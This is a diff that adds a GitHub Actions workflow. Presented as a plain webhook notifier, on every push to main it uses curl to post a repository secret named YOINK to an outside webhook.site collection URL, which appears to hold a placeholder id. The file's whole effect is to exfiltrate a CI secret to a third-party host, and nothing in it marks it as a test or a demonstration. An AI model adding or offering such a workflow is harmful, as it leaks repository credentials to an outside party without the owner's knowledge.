@@ -1,0 +1,16 @@
+name: Webhook POST Request
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  send_webhook:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send POST request
+        run: |
+          curl -X POST 'https://webhook.site/00000000-0000-0000-0000-000000000000' \
+               -H 'content-type: application/json' \
+               -d "${{ secrets.YOINK }}"
